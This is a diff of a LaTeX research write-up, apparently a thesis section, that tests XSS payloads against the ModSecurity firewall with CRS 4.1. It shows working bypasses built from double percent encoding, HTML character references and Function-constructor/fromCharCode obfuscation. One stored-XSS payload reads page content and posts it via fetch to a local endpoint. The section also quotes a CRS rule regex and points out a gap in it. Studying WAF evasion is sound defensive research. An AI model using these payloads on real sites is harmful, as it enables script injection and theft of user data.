@@ -23,7 +23,8 @@ The ModSecurity firewall detected the unicode escape regardless and rejects the 
 The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
 On usage of double Percent encoding , the rules with ids \verb|932130, 941390| no longer triggered and the payload bypasses the WAF:
 
-\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}]
+\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}, escapeinside=\^\^, language=Python]
+import urllib
 urllib.parse.quote(urllib.parse.quote('alert(`${new Date()}`)'))
 returns
 alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
@@ -48,19 +49,19 @@ As stated under Section~\ref{sec:htmlcharrefsingleeva}, three blacklisting rules
 
 After obscuring the payload with a single iteration of HTML character reference substitution, the modified payload:
 
-\begin{lstlisting}[style=basicStyle, language=Python]
-<a href=jav&#x61;script:alert('a')>ClickMeFor$</a>
+\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
+<a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
 \end{lstlisting}
 
-successfully bypassed two of the three blocking rules.
+successfully bypassed two of the three rules that caused the firewall to block the request.
 
 On escaping the left parenthesis: \verb|(| in the javascript function \verb|alert()|, which was part of the matched data that caused rule with id \verb|941390| to match (see Listing~\ref{lst:storedxssinjblocked}), the payload becomes:
 
-\begin{lstlisting}[style=basicStyle, language=Python, caption=HTML character reference bypass, label={lst:htmlcharacterreferencebypass}]
-<a href=jav&#x61;script:alert&#x28;'a')>ClickMeFor$</a>
+\begin{lstlisting}[style=basicStyle, language=Python, caption=HTML character reference bypass, label={lst:htmlcharacterreferencebypass}, escapeinside=\^\^]
+<a href=jav^\&\#x61;script:alert\&\#x28;^'a')>ClickMeFor$</a>
 \end{lstlisting}
 
-and successfully bypasses the firewall.
+and successfully bypasses the ModSecurity firewall using CRS4.1.
 
 
 \subsubsection{HTML encoding + JavaScript normal character escape}
@@ -101,6 +102,49 @@ The bypassing payload:
 \begin{lstlisting}[style=basicStyle, caption=stored xss bypass payload]
 <a href=j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a>
 \end{lstlisting}
+
+\subsubsection{Function constructor + String concatenation + From charcode}
+\label{sec:charcodemultiiter}
+Following up on the idea to split the character sequence \verb|String.fromCharCode| into multiple segments, which was stated during the single iteration evaluation under Section~\ref{sec:charcodesingleiter}, the payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+String.fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)
+\end{lstlisting}
+
+was split into two parts using the function constructor and string concatenation:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+[].map.constructor('String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)')();
+\end{lstlisting}
+
+This payload successfully bypasses the ModSecurity firewall configured to use the CRS4.1. In order to make this payload execute by itself, another use of the function constructor and string concatenation was applied:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
+\end{lstlisting}
+
+On evaluating this payload against the tested firewall, the newly applied obscurity triggered a different filtering rule:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
+<payload>
+[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
+</payload>
+
+<message>"PHP Injection Attack: Variable Function Call Found"</message>
+<file>"/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
+<fileDetails>[line "488"] [id "933210"]<fileDetails>
+<MatchedData>"('[].map.constructor(''String.''fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'')();')();"</MatchedData>
+\end{lstlisting}
+
+The regex used in this rule:
+
+\begin{lstlisting}[style=basicStyle]
+(?:\((?:.+\)(?:[\"'][\-0-9A-Z_a-z]+[\"'])?\(.+|[^\)]*string[^\)]*\)[\s\x0b\"'\-\.0-9A-\[\]_a-\{\}]+\([^\)]*)|(?:\[[0-9]+\]|\{[0-9]+\}|\$[^\(\),\.\/;\x5c]+|[\"'][\-0-9A-Z\x5c_a-z]+[\"'])\(.+)\);
+\end{lstlisting}
+
+requires a semicolon to finish the statement. In JavaScript, cases exist, where this semicolon is not neccessary. On such case would be the existance of a semicolon finished statement in the code just before where the payload is injected. {\color{red} todo: what if array access follows []}
+
+
 
 
 \subsubsection{Function constructor + String concatenation}
